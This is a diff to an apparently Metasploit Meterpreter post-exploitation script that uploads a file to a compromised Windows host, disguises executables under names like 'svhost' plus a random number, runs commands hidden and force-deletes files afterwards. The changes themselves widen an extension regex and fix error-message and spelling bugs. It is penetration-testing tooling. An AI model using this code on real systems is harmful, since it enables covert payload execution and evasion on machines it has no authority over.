@@ -26,7 +26,7 @@ def upload(session,file,trgloc = "")
 			location = trgloc
 		end
 		begin
-			ext = file.scan(/\S*(.exe)/i)
+			ext = file.scan(/\S*(\.exe|\.bat|\.com|\.vbs|\.cmd)/i)
 			if ext.join == ".exe"
 				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
 			else
@@ -42,6 +42,7 @@ def upload(session,file,trgloc = "")
 	end
 	return fileontrgt
 end
+
 #Function for executing a list of commands
 def cmd_exec(session,cmdexe,opt,verbose)
 	r=''
@@ -56,7 +57,7 @@ def cmd_exec(session,cmdexe,opt,verbose)
 			r.channel.close
 			r.close
 		rescue ::Exception => e
-			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
+			print_status("Error Running Command #{cmdexe}: #{e.class} #{e}")
 		end
 	else
 		begin
@@ -64,10 +65,11 @@ def cmd_exec(session,cmdexe,opt,verbose)
 			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
 			r.close
 		rescue ::Exception => e
-			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
+			print_status("Error Running Command #{cmdexe}: #{e.class} #{e}")
 		end
 	end
 end
+
 def m_unlink(session, path)
 	r = session.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
 	while(r.name)
@@ -75,6 +77,7 @@ def m_unlink(session, path)
 	end
 	r.close
 end
+
 #parsing of Options
 file = ""
 cmdopt = ""
@@ -110,4 +113,4 @@ if remove == 1
 	print_status("\tDeleting #{exec}")
 	m_unlink(session, exec)
 end
-print_status("Finnished!")
+print_status("Finished!")
